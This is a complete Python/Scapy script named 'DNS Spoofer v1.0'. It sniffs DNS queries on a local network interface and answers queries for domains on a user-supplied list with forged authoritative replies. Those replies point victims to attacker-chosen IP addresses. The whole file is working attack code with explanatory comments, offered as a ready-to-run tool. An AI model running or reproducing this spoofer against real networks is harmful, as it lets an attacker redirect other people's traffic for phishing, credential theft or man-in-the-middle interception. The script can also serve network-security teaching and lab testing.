#! /usr/bin/python3

from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, sniff
import argparse
import sys
import os

# Colors
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""
    {CYAN}{BOLD}
╭──────────────────────────────────────────╮
│             DNS Spoofer v1.0             │
╰──────────────────────────────────────────╯
    {RESET}""")

def build_dns_response_packet(packet, spoofed_ip_list, domain):
	dns_packet = (
		Ether(dst=packet[Ether].src, src=packet[Ether].dst)/
		IP(dst=packet[IP].src, src=packet[IP].dst)/
		UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/
		DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip_list[domain]))
	)

	return dns_packet

def packet_handler(packet, iface, spoofed_ip_list):
	# Ensure it is a DNS query
	if packet.haslayer(DNSQR):
		# DNS queries often include a trailing dot (e.g., "example.com."), so Strip trailing dot with .rstrip('.')
		domain = packet[DNSQR].qname.decode().rstrip('.')
		src_ip = packet[IP].src

		# Check whether the requested domain is in our spoofed domain resolution list
		if domain in spoofed_ip_list.keys():
			print(f"{YELLOW}Requested domain: {GREEN}{domain}{YELLOW} from {YELLOW}{src_ip} -> Resolved to {GREEN}{spoofed_ip_list[domain]}{RESET}")

			# Generating DNS reply packet
			dns_reply_packet = build_dns_response_packet(packet, spoofed_ip_list, domain)

			try:
				# Use sendp() with the full Ethernet frame if were're on a LAN and want to ensure delivery, If we using send(), which crafts and sends the packet at Layer 3 (IP). However, DNS typically uses Layer 2 (Ethernet) in local networks.
				sendp(dns_reply_packet, iface=iface, verbose=0)
			except Exception as error:
				print(f"{RED}[x] Sending the spoofed DNS reply failed with an error: {error}{RESET}")
				sys.exit(1)

def packet_sniffer(iface, spoofed_list):
	print(f"{CYAN}[•] Sniffing DNS packets...{RESET}")
	print()
	# Use prn= inside sniff() to process each packet as it's captured.
	# Use store=False in sniff() to avoid storing packets in memory unnecessarily.
	# sniff() only allows prn to be a function that takes one argument: the packet. To work around this, you can use a lambda function to pass additional arguments to your packet handler.
	# udp and dst port 53: Sniff all DNS packets
	sniff(iface=iface, filter="udp and dst port 53", prn=lambda packet: packet_handler(packet, iface, spoofed_list), store=False)

def merge_files_to_dict(ipaddr_list, domain_list):
	try:
		with open(ipaddr_list, "r") as ipaddr, open(domain_list, "r") as domain:
			# Return as a list
			keys = domain.read().splitlines()
			values = ipaddr.read().splitlines()

			# Merged lists
			merged_dict = dict(zip(keys, values))
			return merged_dict
	except Exception as read_files_error:
		print(f"{RED}[x] Error while reading the files: {read_files_error}{RESET}")
		sys.exit(1)

def file_validation(ipaddr_list, domain_list):
	# Check whether the IP address and domain list files exist and are not empty.
	for file in [ipaddr_list, domain_list]:
		if not os.path.isfile(file):
			print(f"{RED}[x] {file} : No such a file!\n{RESET}")
			sys.exit(1)

		if os.path.getsize(file) == 0:
			print(f"{RED}[x] {file} : file doesn't contain any content!\n{RESET}")
			sys.exit(1)

def main():
	# Create an argument parser
	# ArgumentDefaultsHelpFormatter ensures default values are shown in the help text
	parser = argparse.ArgumentParser(description="Simple DNS Spoofer with Scapy", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	# Define the command-line arguments
	parser.add_argument("-i", "--iface", metavar="", default="eth0", help="Network interface")
	parser.add_argument("-a", "--ipaddr", metavar="", default="ipaddress_list.txt", help="Path to IP addresses list")
	parser.add_argument("-d", "--domain", metavar="", default="domain_list.txt", help="Path to domains list")

	# Parse and use the arguments
	args = parser.parse_args()

	# Validate the domain and IP address list file
	file_validation(args.ipaddr, args.domain)

	# Read the files and return a merged dictionary (Domain-A:IP-A / Domain-B:IP-B ...)
	merged_dict = merge_files_to_dict(args.ipaddr, args.domain)

	# Print banner
	banner()

	# Sniff DNS packets
	packet_sniffer(args.iface, merged_dict)

main()